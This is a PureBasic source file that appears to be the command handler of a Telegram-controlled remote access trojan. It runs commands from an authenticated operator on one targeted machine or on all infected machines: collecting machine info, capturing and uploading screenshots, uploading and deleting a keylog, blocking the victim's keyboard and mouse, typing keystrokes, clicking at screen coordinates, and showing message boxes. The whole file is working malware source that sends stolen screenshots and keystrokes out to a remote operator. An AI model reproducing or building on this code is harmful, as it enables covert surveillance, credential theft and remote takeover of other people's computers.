;include file for command execution
 XIncludeFile "customtypes.pbi"
XIncludeFile "configreader.pbi"
XIncludeFile "machineinfogatherer.pbi"
XIncludeFile "messagesender.pbi"
XIncludeFile "screenshotter.pbi"
XIncludeFile "keypresser.pbi"
XIncludeFile "mouseclicker.pbi"

EnableExplicit

Global blockInputFlag.i
Declare CarryOut(command.s,fromId.q,messageId.q=0)
Declare MessageBoxThread(*msgboxParams.MessageboxParams)
Declare doBlockInput(bool.i)
Declare BlockInputThread(*_)

Procedure ExecuteCommand(*msg.TelegramMessage)
  Define fromId.q,text.s,command.s,messageId.q
  Define machineId.s,targetMachineId.s
  fromId=*msg\FromId
  text=*msg\Text
  messageId=*msg\MessageId
  
  If fromId=getAuthenticatedUserId() ;only process the authenticated user's message
      If Left(text,1)="/" ;if message is a multicast i.e. for all machines
        command=text ;set the command text
        messageId=-1 ;not a reply
      Else ;message is targeted to specific machine
        machineId=GetHardwareId() ;our machine id
        targetMachineId=Left(text,10) ;look for a target machine id
        If targetMachineId=machineId ;if we're the target machine
          command=Trim(Mid(text,11)) ;set the command text
        EndIf
      EndIf
      
      If command<>"" ;if command is set. only happens if the command is multicast type or ours is the target machine
        CarryOut(command,fromId,messageId) ;send the pure command to execute
      EndIf
      
   
 EndIf
  
EndProcedure

Procedure CarryOut(command.s,fromId.q,messageId.q=0) ;actual command execution inside here
  ;the command.s doesn't contain any target machineId here
  ;if messageId is set, it is a reply to a specific message
  
  Define machineInfo.s
  Define msgboxTitle.s,msgboxText.s,tmp.s
  Static msgboxParams.MessageboxParams ;has to persist even when procedure is ended (used in thread). so, Static
  If Left(command,5)="/info"
    ;give info about this machine
    machineInfo=GetMachineInfo()
    MessageSendText(machineInfo,fromId,messageId)
  EndIf
  If Left(command,7)="/msgbox"
    ;display message box
    tmp=Trim(Mid(command,8))
    msgboxTitle=StringField(tmp,1,";;") ;StringField() works like Split(), only more intuitive. you specify which member you'd like in the second param
    msgboxText=StringField(tmp,2,";;")
    If msgboxTitle<>"" Or msgboxText<>"" ;check against empty message
      msgboxParams\title=msgboxTitle
      msgboxParams\text=msgboxText
      CreateThread(@MessageBoxThread(),@msgboxParams) ;create a thread for the messagebox. don't want the program to pause, do we?  
    EndIf
  EndIf
  If Left(command,11)="/screenshot"
    ;upload screenshot
    Screenshotter::SaveScreenshotPNG(getScreenshotFilepath())
    messageSendFile(getscreenshotFilePath(),fromId,messageId,#True)
  EndIf
  If Left(command,11)="/getkeylog"
    ;upload keylog
    messageSendFile(getKeylogFilePath(),fromId,messageId)
    DeleteFile(getKeylogFilePath())
  EndIf
  If Left(command,11)="/blockinput"
    ;block user input from mouse and keyboard  
    doBlockInput(#True)
  EndIf
  If Left(command,13)="/unblockinput"
    ;unblock user inputs
    doBlockInput(#False)
  EndIf
  If Left(command,9)="/keypress"
    ;type the following string
    tmp=LTrim(Mid(command,10))
    TypeThis(tmp)
  EndIf
  If Left(command,7)="/lclick"
    ;left click
    tmp=Trim(Mid(command,8))
    ClickThis(Val(StringField(tmp,1," ")),Val(StringField(tmp,2," ")),"left")
  EndIf
  If Left(command,7)="/rclick"
    ;right click
    tmp=Trim(Mid(command,8))
    ClickThis(Val(StringField(tmp,1," ")),Val(StringField(tmp,2," ")),"right")
  EndIf
  If Left(command,7)="/mclick"
    ;middle click
    tmp=Trim(Mid(command,8))
    ClickThis(Val(StringField(tmp,1," ")),Val(StringField(tmp,2," ")),"middle")
  EndIf
  
  
  
  

  
  
EndProcedure

Procedure doBlockInput(bool.i)
  Static thread ;preserve value between calls
  blockInputFlag=bool
  If Not IsThread(thread) ;thread not running
      thread=CreateThread(@BlockInputThread(),0)
  EndIf
EndProcedure


Procedure BlockInputThread(*_)
  ;blocks input actively up to a max of 1 minute after which the thread quits and the OS unblocks input
  Define firstTimestamp.i
  firstTimestamp=ElapsedMilliseconds()
  While blockInputFlag And (ElapsedMilliseconds()-firstTimestamp)<60000
    BlockInput_(#True)  
    Delay(500)
  Wend ;when thread exits, system automatically unblocks input
EndProcedure
  
Procedure MessageBoxThread(*params.MessageboxParams)
  Define.s title,text
  title=*params\title
  text=*params\text
  MessageRequester(title,text)
EndProcedure




;references
;https://www.purebasic.fr/english/viewtopic.php?f=37&t=52061-->Passing structures to procedures requires passing the structure variable's pointer
;https://www.purebasic.fr/english/viewtopic.php?f=13&t=55696-->difference between structure pointer and actual structure
;https://www.purebasic.fr/english/viewtopic.php?f=13&t=64167-->Local variables of a procedure go out of scope when passed to CreateThread() and accessed from the thread procedure
; IDE Options = PureBasic 5.70 LTS (Windows - x86)
; CursorPosition = 7
; Folding = -
; EnableAsm
; EnableThread
; EnableXP
; Executable = output.exe
; EnablePurifier